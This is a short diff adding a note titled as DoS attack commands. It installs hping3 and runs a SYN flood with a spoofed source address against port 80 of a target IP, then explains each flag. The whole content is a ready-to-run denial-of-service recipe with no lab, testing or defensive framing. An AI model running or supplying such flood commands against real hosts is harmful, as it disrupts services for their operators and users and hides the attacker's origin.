@@ -1,0 +1,14 @@
+DOS ATTCKS CMD HPING3
+sudo apt update
+sudo apt install hping3
+sudo hping3 -S -a 192.168.1.100 -p 80 --flood 10.0.0.5
+
+-S: Send TCP SYN packets.
+
+-a 192.168.1.100: Spoof source IP as 192.168.1.100.
+
+-p 80: Target port is 80 (HTTP).
+
+--flood: Send packets as fast as possible (flood mode).
+
+10.0.0.5: The target IP address.
